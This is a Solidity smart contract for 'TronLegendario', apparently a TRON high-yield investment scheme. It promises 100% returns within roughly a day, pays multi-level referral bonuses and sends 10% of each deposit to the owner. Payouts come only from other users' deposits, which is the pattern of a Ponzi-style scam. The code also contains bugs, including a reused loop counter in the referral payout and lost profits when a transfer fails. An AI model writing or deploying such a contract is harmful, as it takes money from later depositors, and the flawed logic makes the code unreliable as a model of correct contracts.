pragma solidity ^0.5.14;

import "./SafeMath.sol";

contract TronLegendario {
  using SafeMath for uint;
 
  
  struct Deposit {
    uint tariff;
    uint amount;
    uint at;
  }

  struct Referer {
    address myReferer;
    uint nivel;
  }

  struct Investor {
    bool registered;
    address sponsor;
    bool exist;
    Referer[] referers;
    uint balanceRef;
    uint totalRef;
    Deposit[] deposits;
    uint invested;
    uint paidAt;
    uint withdrawn;
  }
  
  uint MIN_DEPOSIT = 50 trx;

  address payable public owner;
  address public NoValido;
  bool public Do;
  
  uint[7] public tiempo = [1 * 28800, 100 * 28800, 100 * 28800, 100 * 28800, 100 * 28800, 100 * 28800];
  uint[7] public porcent = [100, 200, 300, 400, 600];
  
  uint public tarifa = 0;
  
  uint public totalInvestors;
  uint public totalInvested;
  uint public totalRefRewards;


  mapping (address => Investor) public investors;
  
  constructor() public {
    owner = msg.sender;
    investors[msg.sender].registered = true;
    investors[msg.sender].sponsor = owner;
    investors[msg.sender].exist = true;

    totalInvestors++;
    

  }

  function setstate() public view  returns(uint Investors,uint Invested,uint RefRewards){
      return (totalInvestors, totalInvested, totalRefRewards);
  }

  function InContract() public view returns (uint){
    return address(this).balance;
  }

  function setOwner(address payable _owner) public returns (address){
    require (msg.sender == owner);
    require (_owner != owner);

    owner = _owner;
    investors[owner].registered = true;
    investors[owner].sponsor = owner;
    investors[owner].exist = false;

    totalInvestors++;

    return owner;
  }
  
  function register() internal {
    if (!investors[msg.sender].registered) {
      investors[msg.sender].registered = true;
      totalInvestors++;
    }
  }

  function registerSponsor(address sponsor) internal {
    if (!investors[msg.sender].exist){
      investors[msg.sender].sponsor = sponsor;
      investors[msg.sender].exist = true;
    }
  }

  function registerReferers(address ref, address spo) internal {

      
    if (investors[spo].registered) {

      investors[spo].referers.push(Referer(ref,5));
      uint nvl = 1;
      if (investors[spo].exist){
        spo = investors[spo].sponsor;
        if (investors[spo].registered){
          investors[spo].referers.push(Referer(ref,3));
          nvl = 2;
          if (investors[spo].exist){
            spo = investors[spo].sponsor;
            if (investors[spo].registered){
              investors[spo].referers.push(Referer(ref,2));
              nvl = 3;
              if (investors[spo].exist){
                spo = investors[spo].sponsor;
                if (investors[spo].registered){
                   investors[spo].referers.push(Referer(ref,1));
                   nvl = 4;
                }
              }
            }
          }
        }
      }
    }
  }
  
  function rewardReferers(address yo, uint amount, address sponsor) internal {
    address spo = sponsor;
    for (uint i = 0; i < 4; i++) {

      if (investors[spo].exist) {

        for (i = 0; i < investors[spo].referers.length; i++) {
          if (!investors[spo].registered) {
            break;
          }
          if ( investors[spo].referers[i].myReferer == yo){
              uint b = investors[spo].referers[i].nivel;
              uint a = amount * b / 100;
              investors[spo].balanceRef += a;
              investors[spo].totalRef += a;
              totalRefRewards += a;
          }
        }

        spo = investors[spo].sponsor;
      }
    }
    
    
  }
  
  function nivelContract()external {
      
      
      
  }
  
  function deposit(address _sponsor) external payable {
    require(msg.value >= MIN_DEPOSIT);
    require (_sponsor != msg.sender);
    
    register();

    if (_sponsor != owner && investors[_sponsor].registered && _sponsor != NoValido){
      if (!investors[msg.sender].exist){
        registerSponsor(_sponsor);
        registerReferers(msg.sender, investors[msg.sender].sponsor);
      }
    }

    if (investors[msg.sender].exist){
      rewardReferers(msg.sender, msg.value, investors[msg.sender].sponsor);
    }
    
    investors[msg.sender].invested += msg.value;
    totalInvested += msg.value;
    
    investors[msg.sender].deposits.push(Deposit(tarifa, msg.value, block.number));
    
    owner.transfer(msg.value.mul(10).div(100));

  }
  
  function withdrawable(address any_user) public view returns (uint amount) {
    Investor storage investor = investors[any_user];
    
    for (uint i = 0; i < investor.deposits.length; i++) {
      Deposit storage dep = investor.deposits[i];
      uint tiempoD = tiempo[dep.tariff];
      uint porcientD = porcent[dep.tariff];
      
      uint finish = dep.at + tiempoD;
      uint since = investor.paidAt > dep.at ? investor.paidAt : dep.at;
      uint till = block.number > finish ? finish : block.number;

      if (since < till) {
        amount += dep.amount * (till - since) * porcientD / tiempoD / 100;
      }
    }
  }


  function MYwithdrawable() public view returns (uint amount) {
    Investor storage investor = investors[msg.sender];
    
    for (uint i = 0; i < investor.deposits.length; i++) {
      Deposit storage dep = investor.deposits[i];
      uint tiempoD = tiempo[dep.tariff];
      uint porcientD = porcent[dep.tariff];
      
      uint finish = dep.at + tiempoD;
      uint since = investor.paidAt > dep.at ? investor.paidAt : dep.at;
      uint till = block.number > finish ? finish : block.number;

      if (since < till) {
        amount += dep.amount * (till - since) * porcientD / tiempoD / 100;
      }
    }
  }
  
  function profit() internal returns (uint) {
    Investor storage investor = investors[msg.sender];
    
    uint amount = withdrawable(msg.sender);
    
    amount += investor.balanceRef;
    investor.balanceRef = 0;
    
    investor.paidAt = block.number;
    
    return amount;

  }
  
  function withdraw() external {

    uint amount = profit();
    uint tariff = 0;

    uint amount20 = amount.mul(20).div(100);
    uint amount70 = amount.mul(70).div(100);

    if ( msg.sender.send(amount70) ) {

      investors[msg.sender].withdrawn += amount70;
      investors[msg.sender].invested += amount20;
      
      investors[msg.sender].deposits.push(Deposit(tariff, amount20, block.number));
      
      totalInvested += amount20;
    
    }
    
  }

  function () external payable {}  
  
}
